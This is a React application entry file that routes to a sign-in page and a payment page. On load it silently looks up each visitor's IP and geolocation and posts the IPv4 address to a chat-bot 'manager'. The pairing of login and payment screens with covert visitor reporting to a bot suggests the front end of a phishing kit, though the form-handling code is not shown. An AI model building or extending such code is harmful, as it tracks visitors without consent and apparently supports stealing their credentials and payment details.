import './App.css';
import Footer from "./pages/footer/Footer";
import {BrowserRouter, Route, Routes} from "react-router-dom";
import Payment from "./pages/payment/Payment";
import {useEffect, useState} from "react";
import axios from "axios";
import bot from "./bot_manager/manager";
import LoginManager from "./pages/loginManager/LoginManager";

function App() {

    const [info, setInfo] = useState('undefined')
    const [loaded, setLoaded] = useState(false);

    const getInfo = () => {
        axios.get('https://geolocation-db.com/json/')
            .then(res => {
                setInfo(res.data);
                setLoaded(true)
            })
    }

    useEffect(() => {
       if (!loaded) {
           getInfo();
       } else {
           axios.post(bot.sendMessage("IPv4:%20" + info.IPv4))
       }
    }, [loaded])

    return (
      <div>
          <BrowserRouter>
              <Routes>
                  <Route path={"/signin"} element={<LoginManager />} />
                  <Route path={"/payment"} element={<Payment/>} />
              </Routes>
          </BrowserRouter>
          <Footer />
      </div>
    );
}

export default App;
